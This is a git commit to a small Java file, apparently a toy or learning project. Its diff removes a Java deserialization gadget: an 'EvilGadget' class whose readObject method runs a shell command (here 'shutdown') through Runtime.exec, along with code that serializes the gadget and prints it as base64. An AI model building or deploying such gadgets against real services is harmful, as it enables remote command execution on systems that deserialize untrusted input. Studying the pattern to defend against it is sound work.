8424b3adf6727b5c2261999c87f6e14210551799
maheshashinde <121862667+maheshashinde@users.noreply.github.com>
2023-02-18 11:08:43 +0530

    Update heloo.java

--- src/main/java/heloo.java
+++ src/main/java/heloo.java
@@ -2,23 +2,6 @@ import java.io.*;
 
 public class heloo {
    public static void main(String[] args) {
-         EvilGadget gadget = new EvilGadget("shutdown");
-         ByteArrayOutputStream baos = new ByteArrayOutputStream();
-         ObjectOutputStream out = new ObjectOutputStream(baos);
-         out.writeObject(gadget);
-         out.close();
-         String base64Encoded = Base64.getEncoder().encodeToString(baos.toByteArray());
-         System.out.println(base64Encoded);
+       
    } 
-   
-  class EvilGadget implements Serializable {
-  private String command;
-  public EvilGadget(String command) {
-    this.command = command;
-  }
-  private void readObject(ObjectInputStream in) throws Exception {
-     in.defaultReadObject();
-     Runtime.getRuntime().exec(command);
-  }
-}
 }
